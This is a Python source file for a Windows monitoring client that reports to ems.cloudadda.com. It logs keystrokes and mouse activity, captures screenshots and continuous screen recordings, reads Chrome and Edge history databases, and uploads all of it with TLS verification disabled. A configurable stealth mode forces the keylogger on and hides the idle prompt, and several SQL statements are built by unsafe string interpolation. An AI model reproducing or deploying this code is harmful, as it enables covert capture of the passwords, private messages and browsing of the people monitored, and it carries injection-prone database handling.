import os, sys, time
from mss import mss
import glob, os, threading, json, datetime, time, requests, random, logging, os, imagehash, sqlite3, sys, win32api, win32con, win32job, subprocess, ctypes
from pynput import keyboard, mouse
from win32api import GetUserName
from PIL import Image
from logging.handlers import TimedRotatingFileHandler
from typing import List

requests.packages.urllib3.disable_warnings()

strokes = []
mouse_strokes = []
dev = False
CONFIG = {}
if len(sys.argv) != 2 and len(sys.argv) != 3:
	sys.exit()

if len(sys.argv) == 3 and sys.argv[-1] == "dev":
	dev = True

ROOT_DIR = sys.argv[1]

if not os.path.isdir(ROOT_DIR):
	sys.exit()

WEB_URL = "https://ems.cloudadda.com/"
# WEB_URL = "https://ems.cloudadda.com/" if not dev else "http://127.0.0.1:8000/"
STEALTH_MODE = False
user32 = ctypes.windll.User32

class Logger():
	def __init__(self, render = False):
		formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
		logs_dir = f"{ROOT_DIR}\\logs"
		if not os.path.isdir(logs_dir):
			os.mkdir(logs_dir)
		handler = TimedRotatingFileHandler(f"{ROOT_DIR}\\logs\\output.log", when='midnight', backupCount=10)
		handler.setFormatter(formatter)

		self.logger = logging.getLogger()
		self.logger.addHandler(handler)
		self.logger.setLevel(logging.DEBUG)
		self.render = render

	def info(self, message):
		if self.render:
			print(message)
		self.logger.info(message)

	def warning(self, message):
		if self.render:
			print(message)
		self.logger.warning(message)

	def critical(self, message):
		if self.render:
			print(message)
		self.logger.critical(message)

	def error(self, message):
		if self.render:
			print(message)
		self.logger.error(message)

	def debug(self, message):
		if self.render:
			print(message)
		self.logger.debug(message)

logger = Logger(dev)

class DbConnector():
	def __init__(self, name="engine.db", init = True):
		self.name = name
		if init:
			self.init()

	def init(self):
		try:
			self.conn = sqlite3.connect(self.name, check_same_thread=False, detect_types = sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
			self.conn.isolation_level = None
			return True
		except sqlite3.DatabaseError:
			return False

	def transaction(self, commands: List[str]):
		with self.conn:
			for _ in commands:
				self.conn.cursor().execute(_)

	def execute(self, command: str, commit : bool = False):
		try:
			cursor = self.conn.cursor()
			cursor.execute(command)
			if commit:
				self.conn.commit()
			del cursor
		except Exception as e:
			logger.error(f"Error executing command {command} in DB. {e}")

	def fetch_one(self, command: str):
		try:
			cursor = self.conn.cursor()
			ftchr = cursor.execute(command)
			return ftchr.fetchone()
		except Exception as e:
			logger.error(f"Error executing command {command} in DB. {e}")

	def fetch_all(self, command: str):
		try:
			cursor = self.conn.cursor()
			ftchr = cursor.execute(command)
			return ftchr.fetchall()
		except sqlite3.OperationalError:
			pass
		except Exception as e:
			logger.error(f"Error executing command {command} in DB. {e}")
	
	def close(self):
		try:
			self.conn.close()
		except Exception as e:
			pass


db_conn = DbConnector(name = f"{ROOT_DIR}\\engine.db")

if not os.path.isdir(ROOT_DIR + "\\user_data"):
	os.mkdir(ROOT_DIR + "\\user_data")

class KeyStrokeWriter(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True

		self.date = str(datetime.date.today())
		self.start_time = datetime.datetime.now().strftime("%d-%m-%Y+%H-%M-%S")
		self.interval_time = 5
		self.kill = False
		logger.info("Created Key stroke writer thread")

	def insert_data(self):
		global strokes
		global mouse_strokes
		try:
			with open(ROOT_DIR + "\\user_data\\{}\\{}.ks".format(self.date, self.start_time), 'a+') as fl:
				fl.writelines(strokes)
			strokes = []
			mouse_strokes = []
		except Exception as e:
			logger.error(f"error adding data to key-strokes files. {e}")

	def run(self):
		logger.info("Started Key stroke writer thread")
		st = time.perf_counter()

		while True:
			if time.perf_counter() - st >= self.interval_time:
				self.insert_data()
				st = time.perf_counter()
			if self.kill:
				logger.warning("stopped keyboard thread")
				break
			time.sleep(0.5)

class KeyStrokeListener(threading.Thread):
	def __init__(self, mode):
		threading.Thread.__init__(self)
		self.daemon = True

		self.mode = mode
		self.kill = False
		self.listener = keyboard.Listener(on_press=self.on_press)
		self.mouse_listener = mouse.Listener(
			on_move=self.mouse_on_move,
			on_click=self.mouse_on_click,
			on_scroll=self.mouse_on_scroll
		)
		self.writer = KeyStrokeWriter()
		logger.info("Created keyboard listener thread")

	def mouse_on_move(self, x, y):
		global mouse_strokes
		mouse_strokes.append((x, y))

	def mouse_on_click(self, x, y, button, pressed):
		global mouse_strokes
		mouse_strokes.append((x, y, button, pressed))

	def mouse_on_scroll(self, x, y, dx, dy):
		global mouse_strokes
		mouse_strokes.append((x, y, dx, dy))

	def on_press(self, key):
		global strokes
		strokes.append(str(key).replace("Key.", "").replace("'", "")+"\n")

	def start_logger(self):
		self.mouse_listener.start()
		self.listener.start()
		self.writer.start()

	def run(self):
		logger.info("Started keyboard listener thread")
		if self.mode in [1, 4]:
			self.start_logger()
			while True and not self.kill:
				time.sleep(0.5)
			self.listener.stop()
			self.mouse_listener.stop()
			self.writer.kill = True
			logger.warning("Stopped Key stroke listener")
		else:
			logger.info("No need to run key stroke logger in this mode")

class ScreenShotCapture(threading.Thread):
	def __init__(self, mode):
		threading.Thread.__init__(self)
		self.daemon = True
		self.kill = False
		self.mode = mode
		self.date = str(datetime.date.today())
		self.sc_mx = CONFIG["scmx"] if "scmx" in CONFIG else 30
		self.sc_mn = CONFIG["scmn"] if "scmn" in CONFIG else 10
		self.last_cap = datetime.datetime.now()
		logger.info("Created screen shot capture thread")

	def remove_similar_images(self, img_dir, img_name, cutoff = 5):
		dir_imgs = os.listdir(img_dir)
		hash0 = imagehash.average_hash(Image.open(f'{img_dir}{img_name}'))
		for img in dir_imgs:
			if img != img_name:
				file_name = f'{img_dir}{img}'
				hash1 = imagehash.average_hash(Image.open(file_name)) 
				if hash0 - hash1 < cutoff:
					try:
						os.remove(file_name)
					except PermissionError:
						pass

	def capture_screen(self):
		img_name = f"""{datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")}.png"""
		img_dir = ROOT_DIR + f"""\\user_data\\{self.date}\\images\\"""
		file_name = f"{img_dir}{img_name}"
		with mss(mon=-1) as sct:
			sct.shot(output = file_name)
		self.remove_similar_images(img_dir = img_dir, img_name = img_name)

	def run(self):
		logger.info("Started screen shot capture thread")
		if self.mode in [1, 2]:
			st = time.perf_counter()
			while True and not self.kill:
				if time.perf_counter() - st >= random.randint(self.sc_mn, self.sc_mx):
					st = time.perf_counter()
					self.capture_screen()
				time.sleep(0.5)
			logger.warning("Stopped css thread")
		else:
			logger.info("No need to run screen shot capturer in this mode")

class AppUsageTracking(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True
		self.kill = False
		logger.info("Created App usage tracker thread")

	def run(self):
		logger.info("Started App usage tracker thread")
		file_loc = os.path.join(os.path.dirname(__file__), "apps-usage", "apps-usage.exe")
		try:
			hJob = win32job.CreateJobObject(None, "")
			extended_info = win32job.QueryInformationJobObject(hJob, win32job.JobObjectExtendedLimitInformation)
			extended_info['BasicLimitInformation']['LimitFlags'] = win32job.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
			win32job.SetInformationJobObject(hJob, win32job.JobObjectExtendedLimitInformation, extended_info)

			p = subprocess.Popen(f"{file_loc} \"{ROOT_DIR}\"", shell = False)
			perms = win32con.PROCESS_TERMINATE | win32con.PROCESS_SET_QUOTA
			hProcess = win32api.OpenProcess(perms, False, p.pid)

			win32job.AssignProcessToJobObject(hJob, hProcess)
			while True and not self.kill:
				time.sleep(0.5)
			p.terminate()
			p.kill()
		except Exception as e:
			logger.error(f"Error Starting Apps-Usage. {e} ")
		logger.warning("Stopped app usage tracking thread")

class BrowserTrackHistory(threading.Thread):
	def __init__(self, mode):
		threading.Thread.__init__(self)
		self.daemon = True
		self.kill = False
		self.interval_time = 5
		lst_snd = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'browser_last'; ")
		if lst_snd and lst_snd[0]:
			self.last_send = datetime.datetime.strptime(lst_snd[0], "%Y-%m-%d %H:%M:%S")
		else:
			self.update_browser_last()
		self.mode = mode
		self.db_loc = [
			f'C:\\Users\\{GetUserName()}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History',
			f'C:\\Users\\{GetUserName()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
		]
		logger.info("Created browser history tracker thread")

	def update_browser_last(self):
		self.last_send = datetime.datetime.now()
		db_conn.execute(f""" INSERT INTO kv_pair(key, value) VALUES ('browser_last', '{self.last_send.strftime("%Y-%m-%d %H:%M:%S")}') """, commit = True)

	def get_browser_data(self):
		ret = []
		timestamp = (self.last_send.timestamp() + 11644473600) * (10**6)
		for loc in self.db_loc:
			con = DbConnector(loc, init = False)
			if con.init():
				results = con.fetch_all(f"select url, title, visit_count, datetime(last_visit_time/1e6-11644473600,'unixepoch','localtime') from urls WHERE last_visit_time > {timestamp} ORDER BY last_visit_time DESC")
				if results:
					for res in results:
						ret.append(res)
				con.close()
		return ret

	def run(self):
		logger.info("Started browser history tracker thread")
		if self.mode in [1,4]:
			st = time.perf_counter()
			cntr = 1
			while True and not self.kill:
				if time.perf_counter() - st >= self.interval_time * cntr:
					results = self.get_browser_data()
					if results and len(results) > 0:
						cntr = 1
						try:
							for r in results:
								url = r[0].replace("'", "\\'")
								desc = r[1].replace("'", "\\'")
								db_conn.execute(f"INSERT INTO browser_history(url, description, visit_time, visit_count) VALUES ('{url}', '{desc}', '{r[3]}', {r[2]})")
							self.update_browser_last()
						except Exception as e:
							logger.error(f"Error inserting browser data to local db. {e}")
					else:
						cntr = 2
				time.sleep(0.5)
			logger.warning("Stopped browser tracking history thread")
		else:
			logger.info("No need to run browser history tracker in this mode")

class UserClient(threading.Thread):
	def __init__(self, mode = 4, interval_time = 5, elapsed = 0):
		threading.Thread.__init__(self)
		self.daemon = True
		self.date = str(datetime.date.today())
		if not os.path.isdir(ROOT_DIR + '\\user_data\\' + self.date):
			os.mkdir(ROOT_DIR + '\\user_data\\{}'.format(self.date))
			os.mkdir(ROOT_DIR + '\\user_data\\{}\\images'.format(self.date))
		self.start_time = datetime.datetime.now()
		self.interval_time = interval_time
		self.exit_time = datetime.datetime.now()
		self.run_tasks = {}
		self.max_interval_idle = 120 if not dev else 10
		if "idtm" in CONFIG:
			self.max_interval_idle = CONFIG["idtm"]
		self.max_allow_time = 25 if not dev else 5
		self.idle_time = 0

		self.mode = mode
		self.get_runner_tasks()
		self.kill = False
		self.elapsed = 0

		self.check_last_active(elapsed = elapsed)
		self.init_db()

		logger.info("Started User Monitoring")

	def check_last_active(self, elapsed = 0):
		last = db_conn.fetch_one("SELECT end_time FROM user_active_status WHERE active = 1")
		if last and len(last) == 1:
			last_active = last[0]
			last_active -= datetime.timedelta(seconds = elapsed)
			self.start_time -= datetime.timedelta(seconds = elapsed)

			db_conn.execute(f"UPDATE user_active_status SET end_time = '{last_active}' WHERE active = 1", commit = True)

	def init_db(self):
		db_conn.execute("UPDATE user_active_status SET active = 0;", commit = True)
		db_conn.transaction(commands = [
			f""" INSERT INTO user_active_status (start_time, end_time, mode, active) VALUES ('{self.start_time}', '{self.exit_time}', {self.mode}, 1); """,
			f""" INSERT INTO kv_pair (key, value) VALUES('mode', '{self.mode}'); """,
			"""INSERT INTO kv_pair (key, value) VALUES('aut', '0') ON CONFLICT(key) DO UPDATE SET value='0';"""
		])

	def get_runner_tasks(self):
		modes_tasks = [ ['css', 'ak', 'bth', 'aut'], ['css', 'aut'], ['aut'], ['ak', 'aut', 'bth'] ]
		if "css" in CONFIG and CONFIG['css'] and 'css' in modes_tasks[self.mode-1]:
			self.run_tasks['css'] = ScreenShotCapture(mode = self.mode)
		if (("ak" in CONFIG and CONFIG['ak']) or STEALTH_MODE) and 'ak' in modes_tasks[self.mode-1]:
			self.run_tasks['ak'] = KeyStrokeListener(mode = self.mode)
			self.run_tasks['ak'].writer.insert_data()
		if "bth" in CONFIG and CONFIG['bth'] and 'bth' in modes_tasks[self.mode-1]:
			self.run_tasks['bth'] = BrowserTrackHistory(mode = self.mode)
		if "aut" in CONFIG and CONFIG['aut'] and 'aut' in modes_tasks[self.mode-1]:
			self.run_tasks['aut'] = AppUsageTracking()

	def add_usage_data(self, elapsed_time = 0):
		self.exit_time = datetime.datetime.now() - datetime.timedelta(seconds = elapsed_time)
		db_conn.execute(
			f""" UPDATE user_active_status SET end_time = '{self.exit_time}' WHERE active = 1 and start_time = '{self.start_time}' and mode={self.mode}; """, commit = True
		)

	def kill_child_threads(self):
		for task in self.run_tasks:
			self.run_tasks[task].kill = True
			self.run_tasks[task].join()
	
	def is_unlocked(self):
		if (user32.GetForegroundWindow() == 0):
			return False
		else: 
			return True

	def is_working(self):
		global strokes
		if len(strokes) < 1 and len(mouse_strokes) < 1:
			self.idle_time += self.interval_time
		else:
			self.idle_time = 0
		if self.idle_time > self.max_interval_idle:
			if STEALTH_MODE:
				return False
			logger.warning("Are you there?? Looks like you have been idle for the past few minutes")
			db_conn.execute("UPDATE kv_pair SET value = 1 WHERE key = 'aut';", commit = True)
			st = time.perf_counter()
			act = False
			while time.perf_counter() - st < (self.max_allow_time) and not act:
				val = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'aut';")
				if val and int(val[0]) == 0:
					self.idle_time = 0
					act = True
					logger.info("fine you are")
					return True
				time.sleep(0.5)
			if not act:
				logger.warning("nope you aren't")
				db_conn.execute("UPDATE kv_pair SET value=0 WHERE key = 'aut';", commit = True)
				return False
		return True

	def check_idle(self):
		global strokes
		global mouse_strokes
		if STEALTH_MODE and self.mode == 4:
			if len(strokes) > 0 or len(mouse_strokes) > 0:
				self.kill = True

	def run(self):
		st = time.perf_counter()
		logger.info("IN {} mode".format(['Working', "Conference", "Call", "Idle / Personal Work"][self.mode-1]))
		for task in self.run_tasks:
			self.run_tasks[task].start()
		while True:
			if time.perf_counter() - st >= self.interval_time:
				self.add_usage_data()
				st = time.perf_counter()
			if self.kill:
				self.kill_child_threads()
				logger.warning("stopped main thread with mode = {}".format(self.mode))
				break
			else:
				is_locked = not self.is_unlocked()
				is_not_working = False
				if (self.mode == 1) and ('ak' in self.run_tasks):
					is_not_working = not self.is_working()
				if self.mode == 1:
					if is_locked or is_not_working:
						if is_not_working:
							self.elapsed = self.interval_time + self.max_allow_time
						self.kill = True
				if not is_locked:
					self.check_idle()
				time.sleep(0.5)
		logger.warning("Stopped user client thread")

class UserDataUploader(threading.Thread):
	def __init__(self, email, token):
		threading.Thread.__init__(self)
		self.daemon = True
		self.email = email
		self.running = True
		self.token = token
		self.computer_name = os.getenv('COMPUTERNAME')
		logger.info("Started User data uploading service.")

	def add_browser_data(self):
		try:
			data = db_conn.fetch_all("SELECT * FROM browser_history")
			for db in data:
				query = f"""mutation add_browser_usage{{ addBrowserUsage(email: "{self.email}", token: "{self.token}", url: {json.dumps(db[0])}, description: {json.dumps(db[1])}, visitTime: "{db[2]}", visitCount: {str(db[3])}, usageMachine: "{self.computer_name}") {{ result }} }}"""
				try:
					res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
					if res.status_code == 200:
						resp = res.json()
						if ("data" in resp) and ("addBrowserUsage" in resp["data"]) and ("result" in resp["data"]["addBrowserUsage"]) and (resp["data"]["addBrowserUsage"]["result"]):
							url = db[0].replace("'", "\\'")
							db_conn.execute(f"""DELETE FROM browser_history WHERE url = '{url}' AND visit_time = '{db[2]}';""", commit = True)
				except:
					break
		except Exception as e:
			self.send_error(str(e), "add_browser_data")

	def add_key_strokes(self):
		dat_files = glob.glob(ROOT_DIR + "\\user_data\\*\\*.ks")
		for file in dat_files:
			try:
				ob = file.split("\\")
				dt = ob[-2]
				if dt != str(datetime.date.today()):
					file_name = ob[-1].split(".")[0]
					dl = False
					with open(file, "rb") as fle:
						try:
							req = requests.post(f"{WEB_URL}upload/{self.email}/ak/{file_name}/", files={"file": fle}, json = {"machineName": self.computer_name}, verify = False)
							if req.status_code == 200:
								if req.json()["status"] == 1:
									dl = True
						except Exception as e:
							logger.error(f"Error adding keystrokes to the server. {e}")
					if dl:
						os.remove(file)
					else:
						break
			except Exception as e:
				self.send_error(f"Error uploading file {file}, {file_name}, {e}", "add_key_strokes")

	def upload_usage_data(self):
		data = db_conn.fetch_all("SELECT * FROM user_active_status WHERE active = 0 AND uploaded = 0;")
		data = [ 
			(
				_[0],
				(_[1] - _[0]).total_seconds(),
				_[2],
			) for _ in data 
		]
		rm = True
		for db in data:
			query = f"""mutation add_user_usage{{ addUserUsage(email: "{self.email}", token: "{self.token}", startTime: "{db[0].isoformat()}", workTime: {db[1]}, mode: {db[2]}, usageMachine: "{self.computer_name}") {{ result }} }}"""
			try:
				req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
				if req.status_code == 200:
					resp = req.json()
					if ("data" in resp) and ("addUserUsage" in resp["data"]) and ("result" in resp["data"]["addUserUsage"]) and (resp["data"]["addUserUsage"]["result"]):
						db_conn.execute(f"UPDATE user_active_status SET uploaded = 1 WHERE active = 0 AND start_time = '{db[0]}' AND mode = {db[2]};", commit = True)
				else:
					rm = False
					break
			except Exception as e:
				logger.error(f"Error adding usage data to the server. {e}")
				rm = False
				break
		if rm:
			db_conn.execute(f"DELETE FROM user_active_status WHERE start_time < '{datetime.date.today()}' and uploaded = 1;", commit = True)

	def send_app_usage_data(self):
		try:
			for app_nm, dt, usg_time in db_conn.fetch_all(f"SELECT app_name, date, usage_time FROM user_apps_usage WHERE date != '{datetime.date.today()}' AND uploaded = 0; "):
				query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {json.dumps(app_nm)}, openTime: {usg_time}, date: "{dt}", usageMachine: "{self.computer_name}") {{ result }} }} """
				try:
					req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
					if req.status_code == 200:
						resp = req.json()
						if  ("data" in resp) and ("addAppUsage" in resp["data"]) and ("result" in resp["data"]["addAppUsage"]) and (resp["data"]["addAppUsage"]["result"]):
							app_name = app_nm.replace("'", "\\'")
							db_conn.execute(
								command = f" UPDATE user_apps_usage SET uploaded = 1 WHERE app_name = '{app_name}' AND date = '{dt}' ",
								commit = True
							)
				except Exception as e:
					logger.error(f"Error adding apps usage data to the server. {e}")
			db_conn.execute(command = "DELETE FROM user_apps_usage WHERE uploaded = 1;", commit = True)
		except Exception as e:
			self.send_error(str(e), "send_app_usage_data")

	def add_images(self):
		img_fls = glob.glob(ROOT_DIR + "\\user_data\\*\\images\\*.png")
		for file in img_fls:
			try:
				file_name = file.split("\\")[-1].split(".")[0]
				rm = False
				if os.path.isfile(file):
					with open(file, "rb") as fle:
						try:
							req = requests.post(f"{WEB_URL}upload/{self.email}/css/{file_name}/", files={"file": fle}, json={"machineName": os.getenv('COMPUTERNAME')}, verify = False)
							if req.status_code == 200:
								if req.json()["status"] == 1:
									rm = True
						except Exception as e:
							logger.error(f"Error adding images to the server. {e}")
					if rm:
						os.remove(file)
					else:
						break
			except Exception as e:
				self.send_error(str(e), "add_images")

	def send_error(self, error, where):
		try:
			query = f""" mutation add_user_error{{	addUserError(email:"{self.email}", error: {json.dumps(error)}, where: "{where}", usageMachine: "{self.computer_name}")	{{	result	}}	}} """
			requests.post(f"{WEB_URL}api/", json={"query": query}, verify = False)
		except Exception as e:
			logger.error(f"Error sending error data to the server. {e}")

	def stop(self):
		self.running = False

	def upload_data(self):
		logger.info("Please wait while syncing data to the cloud")
		try:
			self.add_browser_data()
		except Exception as e:
			self.send_error(str(e), "add_browser_data")
		try:
			self.send_app_usage_data()
		except Exception as e:
			self.send_error(str(e), "app_usage_data")
		try:
			self.upload_usage_data()
		except Exception as e:
			self.send_error(str(e), "upload_usage_data")
		try:
			self.add_images()
		except Exception as e:
			self.send_error(str(e), "add_images")
		try:
			self.add_key_strokes()
		except Exception as e:
			self.send_error(str(e), "add_key_strokes")
		logger.info("Finished Uploading data to the server")
	
	def run(self):
		self.upload_data()
		last_send = time.perf_counter()
		while self.running:
			if time.perf_counter() - last_send > random.randint(180, 600):
				last_send = time.perf_counter()
				self.upload_data()
			time.sleep(1)

class ModeListener(threading.Thread):
	def __init__(self, email, token, mode = 4):
		threading.Thread.__init__(self)
		self.daemon = True
		self.mode = mode
		self.monitor_thread = UserClient(mode = self.mode)
		self.email = email
		self.token = token
		self.running = True

	def stop_main_thread(self):
		self.monitor_thread.kill = True
		self.monitor_thread.join()

	def create_new_thread(self, mode, elapsed = 0):
		self.monitor_thread = UserClient(mode = mode, elapsed = elapsed)
	
	def start_new_thread(self):
		self.monitor_thread.start()

	def stop(self):
		self.running = False

	def run(self):
		if self.email and self.token:
			self.monitor_thread.start()
			while self.running:
				cr = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='mode'; """)
				ch_mode = int(cr[0])
				ed = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='elapsed'; """)
				elapsed = 0
				if ed and len(ed) == 1:
					elapsed = int(ed[0])
				if ch_mode != self.mode:
					self.stop_main_thread()
					self.mode = ch_mode
					self.create_new_thread(mode = self.mode, elapsed = elapsed)
					self.start_new_thread()

				if self.monitor_thread.kill: # The thread will only be killed iff the thread mentions it to do (in this desktop is unresponsive. So switching back to idle)
					db_conn.execute(f" UPDATE kv_pair SET value = '{1 if self.mode == 4 else 4}' WHERE key = 'mode' ", commit = True)
					db_conn.execute(f" UPDATE kv_pair SET value = '{self.monitor_thread.elapsed}' WHERE key = 'elapsed' ", commit = True)
				time.sleep(0.5)
		else:
			logger.warning("The app is unregistered. Please download from the site again.")

class ScreenRecorder(threading.Thread):
	def __init__(self, bitrate = 100, max_rate = 150, scale = 1024):
		threading.Thread.__init__(self)
		self.daemon = True
		self.bitrate = bitrate
		self.max_bitrate = max_rate
		self.scale = scale
		self.kill = False
		self.recording_path = os.path.join(ROOT_DIR, "recordings")
		if not os.path.isdir(self.recording_path):
			os.mkdir(self.recording_path)

	def run_recorder(self):
		logger.info("Started Screen recording")
		file_loc = os.path.join(os.path.dirname(__file__), "ffmpeg.exe")
		try:
			p = subprocess.Popen(f"""{file_loc}  -f gdigrab  -framerate 2 -i desktop -c:v libx264 -preset veryslow -b:v {self.bitrate}k -maxrate {self.max_bitrate}k -bufsize {self.max_bitrate*10}k -vf "scale={self.scale}:-1,format=yuv420p" -y -g 4 {self.recording_path}\\{time.time()}.mkv""", shell = False)
			while True and not self.kill:
				time.sleep(0.5)
			p.terminate()
			if p.poll() is None:
				time.sleep(2)
				p.kill()
		except Exception as e:
			logger.error(f"Error Starting screen recording. {e} ")
		logger.warning("Stopped screen recording thread")

	def stop(self):
		self.kill = True
		self.join()

	def run(self):
		self.run_recorder()

if __name__ == '__main__':
	def get_config(email, token):
		query = f'query {{ getUserConfig(email: "{email}", token: "{token}"){{ role, captureScreenShots, activeKeyLogger, browserTrackingHistory, appsUsageTracking, stealthMode, idleTime, scMaxTime, scMinTime, bitrate, maxBitrate, recScale }} }}'
		try:
			res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
			if res.status_code == 200:
				json_data = res.json()
				if "data" in json_data and "getUserConfig" in json_data["data"] and (json_data['data']['getUserConfig']):
					resp = json_data['data']['getUserConfig']
					global CONFIG
					CONFIG = {
						"role": resp['role'], 
						"css": resp['captureScreenShots'], 
						"ak": resp['activeKeyLogger'], 
						"bth": resp['browserTrackingHistory'], 
						"aut": resp['appsUsageTracking'], 
						"sm": resp['stealthMode'],
						"idtm": resp["idleTime"],
						"scmx": resp["scMaxTime"],
						"scmn": resp["scMinTime"],
						"bitrate": resp["bitrate"],
						"max_bitrate": resp["maxBitrate"],
						"rec_scale": resp["recScale"],
					}
					with open(ROOT_DIR + "\\config.json", "w+") as fl:
						json.dump(CONFIG, fl)
		except Exception as e:
			logger.error(f"Error getting user config. {e}")

	db_conn.transaction(commands = [
		""" CREATE TABLE IF NOT EXISTS kv_pair (key STRING primary key ON CONFLICT REPLACE, value STRING); """,
		""" CREATE TABLE IF NOT EXISTS user_active_status (start_time TIMESTAMP, end_time TIMESTAMP, mode INT, active BOOLEAN, uploaded BOOLEAN DEFAULT 0) """,
		""" CREATE TABLE IF NOT EXISTS browser_history (url TEXT, description TEXT, visit_time DATETIME, visit_count INT)""",
		""" CREATE TABLE IF NOT EXISTS user_apps_usage (app_name STRING, date DATE, usage_time REAL DEFAULT 0, uploaded BOOLEAN DEFAULT 0, PRIMARY KEY (app_name, date)) """,
		f""" INSERT INTO kv_pair(key, value) VALUES ('elapsed', '0') """,
		]
	)
	email = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'email';")
	token = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'token';")
	if (email == None) or (token == None):
		db_conn.execute("INSERT INTO kv_pair (key, value) VALUES ('register', '0');", commit = True)
	else:
		email = email[0]
		token = token[0]
		if email != "" and token != "":
			get_config(email, token)
			if os.path.isfile(ROOT_DIR + "\\config.json"):
				with open(ROOT_DIR + "\\config.json") as fl:
					CONFIG = dict(json.load(fl))
				STEALTH_MODE = True if CONFIG["sm"] else False
				db_conn.execute(""" UPDATE kv_pair SET value = 1 WHERE key = 'register'; """)
				if not dev or dev:
					user_data_uploader = UserDataUploader(email, token)
					user_data_uploader.start()
				md_lstn_thread = ModeListener(mode = 4, email = email, token = token)
				md_lstn_thread.start()
				params = {
					"bitrate": CONFIG.get("bitrate", 100),
					"max_rate": CONFIG.get("max_bitrate", 150), 
					"scale": CONFIG.get("rec_scale", 1024)
				}
				sc_rec = ScreenRecorder(**params)
				sc_rec.start()
				def callback(sig):
					sc_rec.stop()
				win32api.SetConsoleCtrlHandler(callback, True)
				try:
					while True:
						time.sleep(1)
				except KeyboardInterrupt:
					sys.exit()
				except Exception as e:
					logger.error(f"Error stopping execution of everything. {e}")
					sys.exit()
			else:
				sys.exit()